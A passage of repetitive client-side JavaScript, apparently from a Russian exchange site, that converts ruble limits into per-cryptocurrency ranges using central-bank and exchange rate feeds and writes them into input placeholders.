                    maxLimitValuteFirst = maxLimitFirst / data.Valute.USD.Value;

                    minLimitValuteFirst = minLimitValuteFirst / PRICE_USDT;
                    maxLimitValuteFirst = maxLimitValuteFirst / PRICE_USDT;

                    minLimitValuteFirst = minLimitValuteFirst.toFixed(2);
                    maxLimitValuteFirst = maxLimitValuteFirst.toFixed(2);

                    document.querySelector('.first__input-one').placeholder = `${minLimitValuteFirst} - ${addedEmptyInNumbers(maxLimitValuteFirst)} USDT`;
                } else if ( valuteFirstName == 'Tether TRC20 (USDT)' ) {
                    minLimitValuteFirst = minLimitFirst / data.Valute.USD.Value;
                    maxLimitValuteFirst = maxLimitFirst / data.Valute.USD.Value;

                    minLimitValuteFirst = minLimitValuteFirst / PRICE_USDT;
                    maxLimitValuteFirst = maxLimitValuteFirst / PRICE_USDT;

                    minLimitValuteFirst = minLimitValuteFirst.toFixed(2);
                    maxLimitValuteFirst = maxLimitValuteFirst.toFixed(2);

                    document.querySelector('.first__input-one').placeholder = `${minLimitValuteFirst} - ${addedEmptyInNumbers(maxLimitValuteFirst)} USDT`;
                } else if ( valuteFirstName == 'Dai (DAI)' ) {
                    minLimitValuteFirst = minLimitFirst / data.Valute.USD.Value;
                    maxLimitValuteFirst = maxLimitFirst / data.Valute.USD.Value;

                    minLimitValuteFirst = minLimitValuteFirst / PRICE_USDT;
                    maxLimitValuteFirst = maxLimitValuteFirst / PRICE_USDT;

                    minLimitValuteFirst = minLimitValuteFirst.toFixed(2);
                    maxLimitValuteFirst = maxLimitValuteFirst.toFixed(2);

                    document.querySelector('.first__input-one').placeholder = `${minLimitValuteFirst} - ${addedEmptyInNumbers(maxLimitValuteFirst)} DAI`;
                } else if ( valuteFirstName == 'Polkadot (DOT)' ) {
                    minLimitValuteFirst = minLimitFirst / data.Valute.USD.Value;
                    maxLimitValuteFirst = maxLimitFirst / data.Valute.USD.Value;

                    minLimitValuteFirst = minLimitValuteFirst / PRICE_DOT;
                    maxLimitValuteFirst = maxLimitValuteFirst / PRICE_DOT;

                    minLimitValuteFirst = minLimitValuteFirst.toFixed(2);
                    maxLimitValuteFirst = maxLimitValuteFirst.toFixed(2);

                    document.querySelector('.first__input-one').placeholder = `${minLimitValuteFirst} - ${addedEmptyInNumbers(maxLimitValuteFirst)} DOT`;
                } else if ( valuteFirstName == 'USD Coin ERC20 (USDC)' ) {
                    minLimitValuteFirst = minLimitFirst / data.Valute.USD.Value;
                    maxLimitValuteFirst = maxLimitFirst / data.Valute.USD.Value;

                    minLimitValuteFirst = minLimitValuteFirst / PRICE_USDC;
                    maxLimitValuteFirst = maxLimitValuteFirst / PRICE_USDC;

                    minLimitValuteFirst = minLimitValuteFirst.toFixed(2);
                    maxLimitValuteFirst = maxLimitValuteFirst.toFixed(2);

                    document.querySelector('.first__input-one').placeholder = `${minLimitValuteFirst} - ${addedEmptyInNumbers(maxLimitValuteFirst)} USDC`;
                } else if ( valuteFirstName == 'Solana (SOL)' ) {
                    minLimitValuteFirst = minLimitFirst / data.Valute.USD.Value;
                    maxLimitValuteFirst = maxLimitFirst / data.Valute.USD.Value;

                    minLimitValuteFirst = minLimitValuteFirst / PRICE_SOL;
                    maxLimitValuteFirst = maxLimitValuteFirst / PRICE_SOL;

                    minLimitValuteFirst = minLimitValuteFirst.toFixed(6);
                    maxLimitValuteFirst = maxLimitValuteFirst.toFixed(6);

                    document.querySelector('.first__input-one').placeholder = `${minLimitValuteFirst} - ${maxLimitValuteFirst} SOL`;
                } else if ( valuteFirstName == 'Polygon (POL)' ) {
                    minLimitValuteFirst = minLimitFirst / data.Valute.USD.Value;
                    maxLimitValuteFirst = maxLimitFirst / data.Valute.USD.Value;

                    minLimitValuteFirst = minLimitValuteFirst / PRICE_POL;
                    maxLimitValuteFirst = maxLimitValuteFirst / PRICE_POL;

                    minLimitValuteFirst = minLimitValuteFirst.toFixed(2);
                    maxLimitValuteFirst = maxLimitValuteFirst.toFixed(2);

                    document.querySelector('.first__input-one').placeholder = `${minLimitValuteFirst} - ${addedEmptyInNumbers(maxLimitValuteFirst)} POL`;
                } else if ( valuteFirstName == 'Ethereum Arbitrum (ETH)' ) {
                    minLimitValuteFirst = minLimitFirst / data.Valute.USD.Value;
                    maxLimitValuteFirst = maxLimitFirst / data.Valute.USD.Value;

                    minLimitValuteFirst = minLimitValuteFirst / PRICE_ETH;
                    maxLimitValuteFirst = maxLimitValuteFirst / PRICE_ETH;

                    minLimitValuteFirst = minLimitValuteFirst.toFixed(6);
                    maxLimitValuteFirst = maxLimitValuteFirst.toFixed(6);

                    document.querySelector('.first__input-one').placeholder = `${minLimitValuteFirst} - ${maxLimitValuteFirst} ETH`;
                } else if ( valuteFirstName == 'Arbitrum one (ARB)' ) {
                    minLimitValuteFirst = minLimitFirst / data.Valute.USD.Value;
                    maxLimitValuteFirst = maxLimitFirst / data.Valute.USD.Value;

                    minLimitValuteFirst = minLimitValuteFirst / PRICE_ARB;
                    maxLimitValuteFirst = maxLimitValuteFirst / PRICE_ARB;

                    minLimitValuteFirst = minLimitValuteFirst.toFixed(2);
                    maxLimitValuteFirst = maxLimitValuteFirst.toFixed(2);

                    document.querySelector('.first__input-one').placeholder = `${minLimitValuteFirst} - ${addedEmptyInNumbers(maxLimitValuteFirst)} ARB`;
                } else if ( valuteFirstName == 'Ethereum (ETH)' ) {
                    minLimitValuteFirst = minLimitFirst / data.Valute.USD.Value;
                    maxLimitValuteFirst = maxLimitFirst / data.Valute.USD.Value;

                    minLimitValuteFirst = minLimitValuteFirst / PRICE_ETH;
                    maxLimitValuteFirst = maxLimitValuteFirst / PRICE_ETH;

                    minLimitValuteFirst = minLimitValuteFirst.toFixed(6);
                    maxLimitValuteFirst = maxLimitValuteFirst.toFixed(6);

                    document.querySelector('.first__input-one').placeholder = `${minLimitValuteFirst} - ${maxLimitValuteFirst} ETH`;
                } else if ( valuteFirstName == 'Ethereum Optimism (ETH)' ) {
                    minLimitValuteFirst = minLimitFirst / data.Valute.USD.Value;
                    maxLimitValuteFirst = maxLimitFirst / data.Valute.USD.Value;

                    minLimitValuteFirst = minLimitValuteFirst / PRICE_ETH;
                    maxLimitValuteFirst = maxLimitValuteFirst / PRICE_ETH;

                    minLimitValuteFirst = minLimitValuteFirst.toFixed(6);
                    maxLimitValuteFirst = maxLimitValuteFirst.toFixed(6);

                    document.querySelector('.first__input-one').placeholder = `${minLimitValuteFirst} - ${maxLimitValuteFirst} ETH`;
                } else if ( valuteFirstName == 'Litecoin (LTC)' ) {
                    minLimitValuteFirst = minLimitFirst / data.Valute.USD.Value;
                    maxLimitValuteFirst = maxLimitFirst / data.Valute.USD.Value;

                    minLimitValuteFirst = minLimitValuteFirst / PRICE_LTC;
                    maxLimitValuteFirst = maxLimitValuteFirst / PRICE_LTC;

                    minLimitValuteFirst = minLimitValuteFirst.toFixed(6);
                    maxLimitValuteFirst = maxLimitValuteFirst.toFixed(6);

                    document.querySelector('.first__input-one').placeholder = `${minLimitValuteFirst} - ${maxLimitValuteFirst} LTC`;
                } else if ( valuteFirstName == 'Bitcoin Cash (BCH)' ) {
                    minLimitValuteFirst = minLimitFirst / data.Valute.USD.Value;
                    maxLimitValuteFirst = maxLimitFirst / data.Valute.USD.Value;

                    minLimitValuteFirst = minLimitValuteFirst / PRICE_BCH;
                    maxLimitValuteFirst = maxLimitValuteFirst / PRICE_BCH;

                    minLimitValuteFirst = minLimitValuteFirst.toFixed(6);
                    maxLimitValuteFirst = maxLimitValuteFirst.toFixed(6);

                    document.querySelector('.first__input-one').placeholder = `${minLimitValuteFirst} - ${maxLimitValuteFirst} BCH`;
                } else if ( valuteFirstName == 'Ripple (XRP)' ) {
                    minLimitValuteFirst = minLimitFirst / data.Valute.USD.Value;
                    maxLimitValuteFirst = maxLimitFirst / data.Valute.USD.Value;

                    minLimitValuteFirst = minLimitValuteFirst / PRICE_XRP;
                    maxLimitValuteFirst = maxLimitValuteFirst / PRICE_XRP;

                    minLimitValuteFirst = minLimitValuteFirst.toFixed(2);
                    maxLimitValuteFirst = maxLimitValuteFirst.toFixed(2);

                    document.querySelector('.first__input-one').placeholder = `${minLimitValuteFirst} - ${addedEmptyInNumbers(maxLimitValuteFirst)} XRP`;
                } else if ( valuteFirstName == 'Dogecoin (DOGE)' ) {
                    minLimitValuteFirst = minLimitFirst / data.Valute.USD.Value;
                    maxLimitValuteFirst = maxLimitFirst / data.Valute.USD.Value;

                    minLimitValuteFirst = minLimitValuteFirst / PRICE_DOGE;
                    maxLimitValuteFirst = maxLimitValuteFirst / PRICE_DOGE;

                    minLimitValuteFirst = minLimitValuteFirst.toFixed(2);
                    maxLimitValuteFirst = maxLimitValuteFirst.toFixed(2);

                    document.querySelector('.first__input-one').placeholder = `${minLimitValuteFirst} - ${addedEmptyInNumbers(maxLimitValuteFirst)} DOGE`;
                } else if ( valuteFirstName == 'Ethereum Classic (ETC)' ) {
                    minLimitValuteFirst = minLimitFirst / data.Valute.USD.Value;
                    maxLimitValuteFirst = maxLimitFirst / data.Valute.USD.Value;

                    minLimitValuteFirst = minLimitValuteFirst / PRICE_ETC;
                    maxLimitValuteFirst = maxLimitValuteFirst / PRICE_ETC;

                    minLimitValuteFirst = minLimitValuteFirst.toFixed(6);
                    maxLimitValuteFirst = maxLimitValuteFirst.toFixed(6);

                    document.querySelector('.first__input-one').placeholder = `${minLimitValuteFirst} - ${(maxLimitValuteFirst)} ETC`;
                } else if ( valuteFirstName == 'Stellar (XLM)' ) {
                    minLimitValuteFirst = minLimitFirst / data.Valute.USD.Value;
                    maxLimitValuteFirst = maxLimitFirst / data.Valute.USD.Value;

                    minLimitValuteFirst = minLimitValuteFirst / PRICE_XLM;
                    maxLimitValuteFirst = maxLimitValuteFirst / PRICE_XLM;

                    minLimitValuteFirst = minLimitValuteFirst.toFixed(2);
                    maxLimitValuteFirst = maxLimitValuteFirst.toFixed(2);

                    document.querySelector('.first__input-one').placeholder = `${addedEmptyInNumbers(minLimitValuteFirst)} - ${addedEmptyInNumbers(maxLimitValuteFirst)} XLM`;
                } else if ( valuteFirstName == 'Tron (TRX)' ) {
                    minLimitValuteFirst = minLimitFirst / data.Valute.USD.Value;
                    maxLimitValuteFirst = maxLimitFirst / data.Valute.USD.Value;

                    minLimitValuteFirst = minLimitValuteFirst / PRICE_TRX;
                    maxLimitValuteFirst = maxLimitValuteFirst / PRICE_TRX;

                    minLimitValuteFirst = minLimitValuteFirst.toFixed(2);
                    maxLimitValuteFirst = maxLimitValuteFirst.toFixed(2);

                    document.querySelector('.first__input-one').placeholder = `${addedEmptyInNumbers(minLimitValuteFirst)} - ${addedEmptyInNumbers(maxLimitValuteFirst)} TRX`;
                } else if ( valuteFirstName == 'Toncoin (TON)' ) {
                    minLimitValuteFirst = minLimitFirst / data.Valute.USD.Value;
                    maxLimitValuteFirst = maxLimitFirst / data.Valute.USD.Value;

                    minLimitValuteFirst = minLimitValuteFirst / PRICE_TON;
                    maxLimitValuteFirst = maxLimitValuteFirst / PRICE_TON;

                    minLimitValuteFirst = minLimitValuteFirst.toFixed(2);
                    maxLimitValuteFirst = maxLimitValuteFirst.toFixed(2);

                    document.querySelector('.first__input-one').placeholder = `${minLimitValuteFirst} - ${addedEmptyInNumbers(maxLimitValuteFirst)} TON`;
                } else if ( valuteFirstName == 'Dash (DASH)' ) {
                    minLimitValuteFirst = minLimitFirst / data.Valute.USD.Value;
                    maxLimitValuteFirst = maxLimitFirst / data.Valute.USD.Value;

                    minLimitValuteFirst = minLimitValuteFirst / PRICE_DASH;
                    maxLimitValuteFirst = maxLimitValuteFirst / PRICE_DASH;

                    minLimitValuteFirst = minLimitValuteFirst.toFixed(2);
                    maxLimitValuteFirst = maxLimitValuteFirst.toFixed(2);

                    document.querySelector('.first__input-one').placeholder = `${minLimitValuteFirst} - ${addedEmptyInNumbers(maxLimitValuteFirst)} DASH`;
                } else if ( valuteFirstName == 'Zcash (ZEC)' ) {
                    minLimitValuteFirst = minLimitFirst / data.Valute.USD.Value;
                    maxLimitValuteFirst = maxLimitFirst / data.Valute.USD.Value;

                    minLimitValuteFirst = minLimitValuteFirst / PRICE_ZEC;
                    maxLimitValuteFirst = maxLimitValuteFirst / PRICE_ZEC;

                    minLimitValuteFirst = minLimitValuteFirst.toFixed(2);
                    maxLimitValuteFirst = maxLimitValuteFirst.toFixed(2);

                    document.querySelector('.first__input-one').placeholder = `${minLimitValuteFirst} - ${addedEmptyInNumbers(maxLimitValuteFirst)} ZEC`;
                } else if ( valuteFirstName == 'Binance Coin (BNB BEP20)' ) {
                    minLimitValuteFirst = minLimitFirst / data.Valute.USD.Value;
                    maxLimitValuteFirst = maxLimitFirst / data.Valute.USD.Value;

                    minLimitValuteFirst = minLimitValuteFirst / PRICE_BNB;
                    maxLimitValuteFirst = maxLimitValuteFirst / PRICE_BNB;

                    minLimitValuteFirst = minLimitValuteFirst.toFixed(2);
                    maxLimitValuteFirst = maxLimitValuteFirst.toFixed(2);

                    document.querySelector('.first__input-one').placeholder = `${minLimitValuteFirst} - ${addedEmptyInNumbers(maxLimitValuteFirst)} BNB`;
                } else if ( valuteFirstName == 'Monero (XMR)' ) {
                    minLimitValuteFirst = minLimitFirst / data.Valute.USD.Value;
                    maxLimitValuteFirst = maxLimitFirst / data.Valute.USD.Value;

                    minLimitValuteFirst = minLimitValuteFirst / PRICE_XMR;
                    maxLimitValuteFirst = maxLimitValuteFirst / PRICE_XMR;

                    minLimitValuteFirst = minLimitValuteFirst.toFixed(2);
                    maxLimitValuteFirst = maxLimitValuteFirst.toFixed(2);

                    document.querySelector('.first__input-one').placeholder = `${minLimitValuteFirst} - ${addedEmptyInNumbers(maxLimitValuteFirst)} XMR`;
                } else if ( valuteFirstName == 'Tether BEP20 (USDT)' ) {
                    minLimitValuteFirst = minLimitFirst / data.Valute.USD.Value;
                    maxLimitValuteFirst = maxLimitFirst / data.Valute.USD.Value;

                    minLimitValuteFirst = minLimitValuteFirst / PRICE_USDT;
                    maxLimitValuteFirst = maxLimitValuteFirst / PRICE_USDT;

                    minLimitValuteFirst = minLimitValuteFirst.toFixed(2);
                    maxLimitValuteFirst = maxLimitValuteFirst.toFixed(2);

                    document.querySelector('.first__input-one').placeholder = `${minLimitValuteFirst} - ${addedEmptyInNumbers(maxLimitValuteFirst)} USDT`;
                } else if ( valuteFirstName == 'Tether TON (USDT)' ) {
                    minLimitValuteFirst = minLimitFirst / data.Valute.USD.Value;
                    maxLimitValuteFirst = maxLimitFirst / data.Valute.USD.Value;

                    minLimitValuteFirst = minLimitValuteFirst / PRICE_USDT;
                    maxLimitValuteFirst = maxLimitValuteFirst / PRICE_USDT;

                    minLimitValuteFirst = minLimitValuteFirst.toFixed(2);
                    maxLimitValuteFirst = maxLimitValuteFirst.toFixed(2);

                    document.querySelector('.first__input-one').placeholder = `${minLimitValuteFirst} - ${addedEmptyInNumbers(maxLimitValuteFirst)} USDT`;
                } else if ( valuteFirstName == 'Tether SOL (USDT)' ) {
                    minLimitValuteFirst = minLimitFirst / data.Valute.USD.Value;
                    maxLimitValuteFirst = maxLimitFirst / data.Valute.USD.Value;

                    minLimitValuteFirst = minLimitValuteFirst / PRICE_USDT;
                    maxLimitValuteFirst = maxLimitValuteFirst / PRICE_USDT;

                    minLimitValuteFirst = minLimitValuteFirst.toFixed(2);
                    maxLimitValuteFirst = maxLimitValuteFirst.toFixed(2);

                    document.querySelector('.first__input-one').placeholder = `${minLimitValuteFirst} - ${addedEmptyInNumbers(maxLimitValuteFirst)} USDT`;
                } else if ( valuteFirstName == 'USD Coin SOL (USDC)' ) {
                    minLimitValuteFirst = minLimitFirst / data.Valute.USD.Value;
                    maxLimitValuteFirst = maxLimitFirst / data.Valute.USD.Value;

                    minLimitValuteFirst = minLimitValuteFirst / PRICE_USDC;
                    maxLimitValuteFirst = maxLimitValuteFirst / PRICE_USDC;

                    minLimitValuteFirst = minLimitValuteFirst.toFixed(2);
                    maxLimitValuteFirst = maxLimitValuteFirst.toFixed(2);

                    document.querySelector('.first__input-one').placeholder = `${minLimitValuteFirst} - ${addedEmptyInNumbers(maxLimitValuteFirst)} USDC`;
                }  else if ( valuteFirstName == 'Monero (XMR)' ) {
                    minLimitValuteFirst = minLimitFirst / data.Valute.USD.Value;
                    maxLimitValuteFirst = maxLimitFirst / data.Valute.USD.Value;

                    minLimitValuteFirst = minLimitValuteFirst / PRICE_XMR;
                    maxLimitValuteFirst = maxLimitValuteFirst / PRICE_XMR;

                    minLimitValuteFirst = minLimitValuteFirst.toFixed(2);
                    maxLimitValuteFirst = maxLimitValuteFirst.toFixed(2);

                    document.querySelector('.first__input-one').placeholder = `${minLimitValuteFirst} - ${maxLimitValuteFirst} XMR`;
                } else if ( valuteFirstName == 'Dash (DASH)' ) {
                    minLimitValuteFirst = minLimitFirst / data.Valute.USD.Value;
                    maxLimitValuteFirst = maxLimitFirst / data.Valute.USD.Value;

                    minLimitValuteFirst = minLimitValuteFirst / PRICE_DASH;
                    maxLimitValuteFirst = maxLimitValuteFirst / PRICE_DASH;

                    minLimitValuteFirst = minLimitValuteFirst.toFixed(6);
                    maxLimitValuteFirst = maxLimitValuteFirst.toFixed(6);

                    document.querySelector('.first__input-one').placeholder = `${minLimitValuteFirst} - ${maxLimitValuteFirst} DASH`;
                } else if ( valuteFirstName == 'Zcash (ZEC)' ) {
                    minLimitValuteFirst = minLimitFirst / data.Valute.USD.Value;
                    maxLimitValuteFirst = maxLimitFirst / data.Valute.USD.Value;

                    minLimitValuteFirst = minLimitValuteFirst / PRICE_ZEC;
                    maxLimitValuteFirst = maxLimitValuteFirst / PRICE_ZEC;

                    minLimitValuteFirst = minLimitValuteFirst.toFixed(6);
                    maxLimitValuteFirst = maxLimitValuteFirst.toFixed(6);

                    document.querySelector('.first__input-one').placeholder = `${minLimitValuteFirst} - ${maxLimitValuteFirst} ZEC`;
                } else if ( valuteFirstName == 'Binance Coin (BNB BEP20)' ) {
                    minLimitValuteFirst = minLimitFirst / data.Valute.USD.Value;
                    maxLimitValuteFirst = maxLimitFirst / data.Valute.USD.Value;

                    minLimitValuteFirst = minLimitValuteFirst / PRICE_BNB;
                    maxLimitValuteFirst = maxLimitValuteFirst / PRICE_BNB;

                    minLimitValuteFirst = minLimitValuteFirst.toFixed(6);
                    maxLimitValuteFirst = maxLimitValuteFirst.toFixed(6);

                    document.querySelector('.first__input-one').placeholder = `${minLimitValuteFirst} - ${maxLimitValuteFirst} BNB`;
                }
            
            }
            getCurrencies();
            
        }).catch((error) => {
            console.error('Ошибка получения списка: ', error);
        })

    }

    // Перепись лимитов на второй инпут

    if ( valuteCategorySecond == 'BANK' || valuteCategorySecond == 'SBP' ) {
        document.querySelector('.first__input-two').placeholder = '7 000 - 780 000 RUB';
        minLimitSecond = 7000;
        maxLimitSecond = 780000;
    } else if ( valuteCategorySecond == 'PAYSYSTEM' ) {

        async function getCurrencies(){  
            const url = 'https://www.cbr-xml-daily.ru/daily_json.js';
            const response = await fetch(url);
            const data = await response.json();

            minLimitValuteSecond = minLimitSecond / data.Valute.USD.Value;
            maxLimitValuteSecond = maxLimitSecond / data.Valute.USD.Value;

            minLimitValuteSecond = minLimitValuteSecond.toFixed(2);
            maxLimitValuteSecond = maxLimitValuteSecond.toFixed(2);
        
            document.querySelector('.first__input-two').placeholder = `${minLimitValuteSecond} - ${addedEmptyInNumbers(maxLimitValuteSecond)} USD`;
        }
    
        getCurrencies();

    } else if ( valuteCategorySecond == 'CRYPTO' ) {

        fetch('https://api.exmo.com/v1/ticker/').then(async(result) => {
        if (result.status === 200 && result.ok) {
            return result.json()
        }
        }).then((JSON_DATA) => {

            async function getCurrencies(){  
                const url = 'https://www.cbr-xml-daily.ru/daily_json.js';
                const response = await fetch(url);
                const data = await response.json();

                if ( valuteSecondName == 'Bitcoin (BTC)' ) {
                    minLimitValuteSecond = minLimitSecond / data.Valute.USD.Value;
                    maxLimitValuteSecond = maxLimitSecond / data.Valute.USD.Value;

                    minLimitValuteSecond = minLimitValuteSecond / PRICE_BTC;
                    maxLimitValuteSecond = maxLimitValuteSecond / PRICE_BTC;

                    minLimitValuteSecond = minLimitValuteSecond.toFixed(6);
                    maxLimitValuteSecond = maxLimitValuteSecond.toFixed(6);

                    document.querySelector('.first__input-two').placeholder = `${minLimitValuteSecond} - ${maxLimitValuteSecond} BTC`;
                } else if ( valuteSecondName == 'Tether ERC20 (USDT)' ) {
                    minLimitValuteSecond = minLimitSecond / data.Valute.USD.Value;
                    maxLimitValuteSecond = maxLimitSecond / data.Valute.USD.Value;

                    minLimitValuteSecond = minLimitValuteSecond / PRICE_USDT;
                    maxLimitValuteSecond = maxLimitValuteSecond / PRICE_USDT;

                    minLimitValuteSecond = minLimitValuteSecond.toFixed(2);
                    maxLimitValuteSecond = maxLimitValuteSecond.toFixed(2);

                    document.querySelector('.first__input-two').placeholder = `${minLimitValuteSecond} - ${addedEmptyInNumbers(maxLimitValuteSecond)} USDT`;
                } else if ( valuteSecondName == 'Tether TRC20 (USDT)' ) {
                    minLimitValuteSecond = minLimitSecond / data.Valute.USD.Value;
                    maxLimitValuteSecond = maxLimitSecond / data.Valute.USD.Value;

                    minLimitValuteSecond = minLimitValuteSecond / PRICE_USDT;
                    maxLimitValuteSecond = maxLimitValuteSecond / PRICE_USDT;

                    minLimitValuteSecond = minLimitValuteSecond.toFixed(2);
                    maxLimitValuteSecond = maxLimitValuteSecond.toFixed(2);

                    document.querySelector('.first__input-two').placeholder = `${minLimitValuteSecond} - ${addedEmptyInNumbers(maxLimitValuteSecond)} USDT`;
                } else if ( valuteSecondName == 'Dai (DAI)' ) {
                    minLimitValuteSecond = minLimitSecond / data.Valute.USD.Value;
                    maxLimitValuteSecond = maxLimitSecond / data.Valute.USD.Value;

                    minLimitValuteSecond = minLimitValuteSecond / PRICE_DAI;
                    maxLimitValuteSecond = maxLimitValuteSecond / PRICE_DAI;

                    minLimitValuteSecond = minLimitValuteSecond.toFixed(2);
                    maxLimitValuteSecond = maxLimitValuteSecond.toFixed(2);

                    document.querySelector('.first__input-two').placeholder = `${minLimitValuteSecond} - ${addedEmptyInNumbers(maxLimitValuteSecond)} DAI`;
                } else if ( valuteSecondName == 'Polkadot (DOT)' ) {
                    minLimitValuteSecond = minLimitSecond / data.Valute.USD.Value;
                    maxLimitValuteSecond = maxLimitSecond / data.Valute.USD.Value;

                    minLimitValuteSecond = minLimitValuteSecond / PRICE_DOT;
                    maxLimitValuteSecond = maxLimitValuteSecond / PRICE_DOT;

                    minLimitValuteSecond = minLimitValuteSecond.toFixed(2);
                    maxLimitValuteSecond = maxLimitValuteSecond.toFixed(2);

                    document.querySelector('.first__input-two').placeholder = `${minLimitValuteSecond} - ${addedEmptyInNumbers(maxLimitValuteSecond)} DOT`;
                } else if ( valuteSecondName == 'USD Coin ERC20 (USDC)' ) {
                    minLimitValuteSecond = minLimitSecond / data.Valute.USD.Value;
                    maxLimitValuteSecond = maxLimitSecond / data.Valute.USD.Value;

                    minLimitValuteSecond = minLimitValuteSecond / PRICE_USDC;
                    maxLimitValuteSecond = maxLimitValuteSecond / PRICE_USDC;

                    minLimitValuteSecond = minLimitValuteSecond.toFixed(2);
                    maxLimitValuteSecond = maxLimitValuteSecond.toFixed(2);

                    document.querySelector('.first__input-two').placeholder = `${minLimitValuteSecond} - ${addedEmptyInNumbers(maxLimitValuteSecond)} USDC`;
                } else if ( valuteSecondName == 'Solana (SOL)' ) {
                    minLimitValuteSecond = minLimitSecond / data.Valute.USD.Value;
                    maxLimitValuteSecond = maxLimitSecond / data.Valute.USD.Value;

                    minLimitValuteSecond = minLimitValuteSecond / PRICE_SOL;
                    maxLimitValuteSecond = maxLimitValuteSecond / PRICE_SOL;

                    minLimitValuteSecond = minLimitValuteSecond.toFixed(6);
                    maxLimitValuteSecond = maxLimitValuteSecond.toFixed(6);

                    document.querySelector('.first__input-two').placeholder = `${minLimitValuteSecond} - ${maxLimitValuteSecond} SOL`;
                } else if ( valuteSecondName == 'Polygon (POL)' ) {
                    minLimitValuteSecond = minLimitSecond / data.Valute.USD.Value;
                    maxLimitValuteSecond = maxLimitSecond / data.Valute.USD.Value;

                    minLimitValuteSecond = minLimitValuteSecond / PRICE_POL;
                    maxLimitValuteSecond = maxLimitValuteSecond / PRICE_POL;

                    minLimitValuteSecond = minLimitValuteSecond.toFixed(2);
                    maxLimitValuteSecond = maxLimitValuteSecond.toFixed(2);

                    document.querySelector('.first__input-two').placeholder = `${minLimitValuteSecond} - ${addedEmptyInNumbers(maxLimitValuteSecond)} POL`;
                } else if ( valuteSecondName == 'Ethereum Arbitrum (ETH)' ) {
                    minLimitValuteSecond = minLimitSecond / data.Valute.USD.Value;
                    maxLimitValuteSecond = maxLimitSecond / data.Valute.USD.Value;

                    minLimitValuteSecond = minLimitValuteSecond / PRICE_ETH;
                    maxLimitValuteSecond = maxLimitValuteSecond / PRICE_ETH;

                    minLimitValuteSecond = minLimitValuteSecond.toFixed(6);
                    maxLimitValuteSecond = maxLimitValuteSecond.toFixed(6);

                    document.querySelector('.first__input-two').placeholder = `${minLimitValuteSecond} - ${maxLimitValuteSecond} ETH`;
                } else if ( valuteSecondName == 'Arbitrum one (ARB)' ) {
                    minLimitValuteSecond = minLimitSecond / data.Valute.USD.Value;
                    maxLimitValuteSecond = maxLimitSecond / data.Valute.USD.Value;

                    minLimitValuteSecond = minLimitValuteSecond / PRICE_ARB;
                    maxLimitValuteSecond = maxLimitValuteSecond / PRICE_ARB;

                    minLimitValuteSecond = minLimitValuteSecond.toFixed(2);
                    maxLimitValuteSecond = maxLimitValuteSecond.toFixed(2);

                    document.querySelector('.first__input-two').placeholder = `${minLimitValuteSecond} - ${addedEmptyInNumbers(maxLimitValuteSecond)} ARB`;
                } else if ( valuteSecondName == 'Ethereum (ETH)' ) {
                    minLimitValuteSecond = minLimitSecond / data.Valute.USD.Value;
                    maxLimitValuteSecond = maxLimitSecond / data.Valute.USD.Value;

                    minLimitValuteSecond = minLimitValuteSecond / PRICE_ETH;
                    maxLimitValuteSecond = maxLimitValuteSecond / PRICE_ETH;

                    minLimitValuteSecond = minLimitValuteSecond.toFixed(6);
                    maxLimitValuteSecond = maxLimitValuteSecond.toFixed(6);

                    document.querySelector('.first__input-two').placeholder = `${minLimitValuteSecond} - ${maxLimitValuteSecond} ETH`;
                } else if ( valuteSecondName == 'Ethereum Optimism (ETH)' ) {
                    minLimitValuteSecond = minLimitSecond / data.Valute.USD.Value;
                    maxLimitValuteSecond = maxLimitSecond / data.Valute.USD.Value;

                    minLimitValuteSecond = minLimitValuteSecond / PRICE_ETH;
                    maxLimitValuteSecond = maxLimitValuteSecond / PRICE_ETH;

                    minLimitValuteSecond = minLimitValuteSecond.toFixed(6);
                    maxLimitValuteSecond = maxLimitValuteSecond.toFixed(6);

                    document.querySelector('.first__input-two').placeholder = `${minLimitValuteSecond} - ${maxLimitValuteSecond} ETH`;
                } else if ( valuteSecondName == 'Litecoin (LTC)' ) {
                    minLimitValuteSecond = minLimitSecond / data.Valute.USD.Value;
                    maxLimitValuteSecond = maxLimitSecond / data.Valute.USD.Value;

                    minLimitValuteSecond = minLimitValuteSecond / PRICE_LTC;
                    maxLimitValuteSecond = maxLimitValuteSecond / PRICE_LTC;

                    minLimitValuteSecond = minLimitValuteSecond.toFixed(6);
                    maxLimitValuteSecond = maxLimitValuteSecond.toFixed(6);

                    document.querySelector('.first__input-two').placeholder = `${minLimitValuteSecond} - ${maxLimitValuteSecond} LTC`;
                } else if ( valuteSecondName == 'Bitcoin Cash (BCH)' ) {
                    minLimitValuteSecond = minLimitSecond / data.Valute.USD.Value;
                    maxLimitValuteSecond = maxLimitSecond / data.Valute.USD.Value;

                    minLimitValuteSecond = minLimitValuteSecond / PRICE_BCH;
                    maxLimitValuteSecond = maxLimitValuteSecond / PRICE_BCH;

                    minLimitValuteSecond = minLimitValuteSecond.toFixed(6);
                    maxLimitValuteSecond = maxLimitValuteSecond.toFixed(6);

                    document.querySelector('.first__input-two').placeholder = `${minLimitValuteSecond} - ${maxLimitValuteSecond} BCH`;
                } else if ( valuteSecondName == 'Ripple (XRP)' ) {
                    minLimitValuteSecond = minLimitSecond / data.Valute.USD.Value;
                    maxLimitValuteSecond = maxLimitSecond / data.Valute.USD.Value;

                    minLimitValuteSecond = minLimitValuteSecond / PRICE_XRP;
                    maxLimitValuteSecond = maxLimitValuteSecond / PRICE_XRP;

                    minLimitValuteSecond = minLimitValuteSecond.toFixed(2);
                    maxLimitValuteSecond = maxLimitValuteSecond.toFixed(2);

                    document.querySelector('.first__input-two').placeholder = `${minLimitValuteSecond} - ${addedEmptyInNumbers(maxLimitValuteSecond)} XRP`;
                } else if ( valuteSecondName == 'Dogecoin (DOGE)' ) {
                    minLimitValuteSecond = minLimitSecond / data.Valute.USD.Value;
                    maxLimitValuteSecond = maxLimitSecond / data.Valute.USD.Value;

                    minLimitValuteSecond = minLimitValuteSecond / PRICE_DOGE;
                    maxLimitValuteSecond = maxLimitValuteSecond / PRICE_DOGE;

                    minLimitValuteSecond = minLimitValuteSecond.toFixed(2);
                    maxLimitValuteSecond = maxLimitValuteSecond.toFixed(2);

                    document.querySelector('.first__input-two').placeholder = `${minLimitValuteSecond} - ${addedEmptyInNumbers(maxLimitValuteSecond)} DOGE`;
                } else if ( valuteSecondName == 'Ethereum Classic (ETC)' ) {
                    minLimitValuteSecond = minLimitSecond / data.Valute.USD.Value;
                    maxLimitValuteSecond = maxLimitSecond / data.Valute.USD.Value;

                    minLimitValuteSecond = minLimitValuteSecond / PRICE_ETC;
                    maxLimitValuteSecond = maxLimitValuteSecond / PRICE_ETC;

                    minLimitValuteSecond = minLimitValuteSecond.toFixed(6);
